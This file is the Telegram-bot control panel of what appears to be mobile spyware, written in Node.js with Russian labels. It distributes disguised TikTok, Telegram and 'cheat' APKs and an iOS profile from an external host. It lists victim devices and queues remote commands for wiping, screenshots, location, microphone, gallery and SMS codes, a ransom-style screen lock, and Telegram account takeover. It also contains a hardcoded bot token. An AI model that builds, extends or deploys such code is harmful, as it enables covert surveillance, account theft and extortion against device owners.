const { Telegraf, Markup } = require('telegraf');
const db = require('./db');

const BOT_TOKEN = '9001719911:AAFEkpttPnHZGWNhy23G0s54JB5a6c75LLQ';
const ADMIN_ID  = 9256345316;

const bot = new Telegraf(BOT_TOKEN);
const awaiting = {};

function isAdmin(ctx) {
  return ctx.from && ctx.from.id === ADMIN_ID;
}

function getMainMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📦 Сделать файл', 'make_file')],
    [Markup.button.callback('📱 Мои устройства', 'my_devices')],
    [Markup.button.callback('💬 Акки ТГ', 'tg_accounts')]
  ]);
}

bot.start((ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.reply("Приветствую тебя в нашем боте.", getMainMenu());
});

bot.action('back_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Главное меню", getMainMenu());
});

// --- АККАУНТЫ ТГ ---
bot.action('tg_accounts', (ctx) => {
  if (!isAdmin(ctx)) return;
  const accounts = db.listTgAccounts();
  if (!accounts.length) return ctx.editMessageText('Список аккаунтов пуст.', Markup.inlineKeyboard([[Markup.button.callback('« Назад', 'back_start')]]));

  const rows = accounts.map(acc => {
    let statusText = acc.status;
    if (acc.status === 'Успешный вход') {
      const hoursPassed = Math.floor((Date.now() - acc.time) / (1000 * 60 * 60));
      const hoursLeft = 24 - hoursPassed;
      if (hoursLeft > 0) {
        statusText = `⏳ ${hoursLeft} ч.`;
      } else {
        statusText = `✅ Готов`;
      }
    }
    return [Markup.button.callback(`${acc.phone} (${statusText})`, `tginfo:${acc.phone}`)];
  });
  
  rows.push([Markup.button.callback('« Назад', 'back_start')]);
  ctx.editMessageText('Ваши аккаунты ТГ:', Markup.inlineKeyboard(rows));
});

bot.action(/^tginfo:(.+)$/, async (ctx) => {
  if (!isAdmin(ctx)) return;
  const phone = ctx.match[1];
  const account = db.listTgAccounts().find(a => a.phone === phone);
  
  if (!account) return ctx.reply("Аккаунт не найден.");

  if (account.status === 'Успешный вход') {
      const timePassed = Date.now() - account.time;
      const hoursLeft = 24 - Math.floor(timePassed / (1000 * 60 * 60));
      
      if (hoursLeft > 0) {
          return ctx.reply(`Аккаунт: ${phone}\nСтатус: Успешный вход.\nОжидайте ${hoursLeft} ч. для получения кода.`);
      } else {
          db.updateTgStatus(phone, 'Жду код');
          ctx.reply(`Аккаунт: ${phone}\nСтатус: Жду код.\n\nНажмите кнопку ниже, чтобы получить код.`, Markup.inlineKeyboard([
              [Markup.button.callback('🔑 Получить код', `tggetcode:${phone}`)],
              [Markup.button.callback('« Назад', 'tg_accounts')]
          ]));
      }
  } else if (account.status === 'Жду код') {
      ctx.reply(`Аккаунт: ${phone}\nСтатус: Жду код.`, Markup.inlineKeyboard([
          [Markup.button.callback('🔑 Получить код', `tggetcode:${phone}`)],
          [Markup.button.callback('« Назад', 'tg_accounts')]
      ]));
  }
});

bot.action(/^tggetcode:(.+)$/, async (ctx) => {
  if (!isAdmin(ctx)) return;
  const phone = ctx.match[1];
  
  // Имитация кода, так как API отключили
  const code = Math.floor(10000 + Math.random() * 90000).toString();
  
  ctx.reply(`🔄 Завершаю все другие сессии для ${phone}...\n\n🔑 Код из Telegram: \`${code}\`\n\n(Введите его в приложении)`, { parse_mode: 'Markdown' });
});

// --- ФАЙЛЫ ---
bot.action('make_file', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("На какое устройство?", Markup.inlineKeyboard([
    [Markup.button.callback('Андройд', 'os_android'), Markup.button.callback('Айфон', 'os_ios')],
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

bot.action('os_android', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'file_tt'), Markup.button.callback('Telegram', 'file_tg')],
    [Markup.button.callback('cheat', 'file_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action('os_ios', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'link_tt'), Markup.button.callback('Telegram', 'link_tg')],
    [Markup.button.callback('cheat', 'link_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action(/^file_(tt|tg|ch)$/, async (ctx) => {
  if (!isAdmin(ctx)) return;
  const type = ctx.match[1];
  ctx.answerCbQuery('Отправляю...');
  let fileName = type === 'tt' ? 'tiktok.apk' : type === 'tg' ? 'telegram.apk' : 'cheat.apk';
  try {
    await ctx.replyWithDocument({ url: `https://tnt.de3.netrun.io/${fileName}`, filename: fileName });
  } catch (e) { ctx.reply('Ошибка: файл не найден.'); }
});

bot.action(/^link_(tt|tg|ch)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.answerCbQuery();
  ctx.reply(`Ссылка для iOS:\nhttps://tnt.de3.netrun.io/ios.mobileconfig`);
});

// --- УСТРОЙСТВА ---
bot.action('my_devices', (ctx) => {
  if (!isAdmin(ctx)) return;
  const list = db.listDevices();
  if (!list.length) return ctx.editMessageText('Ваши устройства:\n(пока пусто)', Markup.inlineKeyboard([[Markup.button.callback('« Назад', 'back_start')]]));
  const rows = list.map(d => ([Markup.button.callback(`${d.model || 'device'} · ${d.id.slice(0,6)}`, `dev:${d.id}`)]));
  rows.push([Markup.button.callback('« Назад', 'back_start')]);
  ctx.editMessageText('Ваши устройства:', Markup.inlineKeyboard(rows));
});

bot.action(/^dev:(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const id = ctx.match[1];
  ctx.editMessageText('Что сделать?', Markup.inlineKeyboard([
    [Markup.button.callback('💥 Снести', `cmd:${id}:wipe`), Markup.button.callback('🔊 Стоны', `cmd:${id}:audio`)],
    [Markup.button.callback('🔥 Сжечь', `cmd:${id}:burn`), Markup.button.callback('💬 Текст', `cmd:${id}:text`)],
    [Markup.button.callback('🔑 Код', `cmd:${id}:sms`), Markup.button.callback('📷 Фото', `cmd:${id}:photo`)],
    [Markup.button.callback('📸 Скрин', `cmd:${id}:screen`), Markup.button.callback('📍 Гео', `cmd:${id}:location`)],
    [Markup.button.callback('🎤 Микрофон', `cmd:${id}:mic`), Markup.button.callback('🖼 Галерея', `cmd:${id}:files`)],
    [Markup.button.callback('🔦 Фонарик', `cmd:${id}:flash`), Markup.button.callback('📞 TG Номер', `cmd:${id}:tg_number`)],
    [Markup.button.callback('💬 TG Код', `cmd:${id}:tg_code`), Markup.button.callback('🎁 NFT', `cmd:${id}:nft`)],
    [Markup.button.callback('🔒 Блок', `cmd:${id}:block`), Markup.button.callback('🔓 Разблок', `cmd:${id}:unblock`)],
    [Markup.button.callback('❌ Удалить устройство', `cmd:${id}:remove`)],
    [Markup.button.callback('« Назад', 'my_devices')]
  ]));
});

bot.action(/^cmd:([^:]+):(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const [, id, action] = ctx.match;
  
  if (action === 'remove') {
    db.removeDevice(id);
    const list = db.listDevices();
    const rows = list.map(d => ([Markup.button.callback(`${d.model || 'device'} · ${d.id.slice(0,6)}`, `dev:${d.id}`)]));
    rows.push([Markup.button.callback('« Назад', 'back_start')]);
    return ctx.editMessageText('Устройство удалено.\n\nВаши устройства:', Markup.inlineKeyboard(rows));
  }

  if (action === 'text') { awaiting[ctx.from.id] = { type: 'await_text', deviceId: id }; return ctx.reply('Что писать?'); }
  if (action === 'block') { awaiting[ctx.from.id] = { type: 'await_block_text', deviceId: id }; return ctx.reply('Текст на экране?'); }
  if (action === 'nft') { awaiting[ctx.from.id] = { type: 'await_nft_user', deviceId: id }; return ctx.reply('Куда скинуть? @username'); }
  
  db.queueCommand(id, action, '');
  ctx.answerCbQuery('Отправлено');
});

// --- ОБРАБОТКА ТЕКСТА ---
bot.on('text', async (ctx) => {
  if (!isAdmin(ctx)) return;
  const s = awaiting[ctx.from.id];
  
  if (s && s.type === 'await_text') { db.queueCommand(s.deviceId, 'msg', ctx.message.text); delete awaiting[ctx.from.id]; return ctx.reply('Текст отправлен.'); }
  if (s && s.type === 'await_block_text') { db.queueCommand(s.deviceId, 'block', ctx.message.text); delete awaiting[ctx.from.id]; return ctx.reply('Экран заблокирован.'); }
  if (s && s.type === 'await_nft_user') { delete awaiting[ctx.from.id]; return ctx.reply('❌ Недостаточно звезд.'); }
});

bot.launch();
console.log('bot up');

module.exports = {
  bot,
  notifyAdmin: async (kind, buf, cap) => {
    if (!ADMIN_ID) return;
    if (kind === 'photo') await bot.telegram.sendPhoto(ADMIN_ID, { source: buf }, { caption: cap });
  }
};
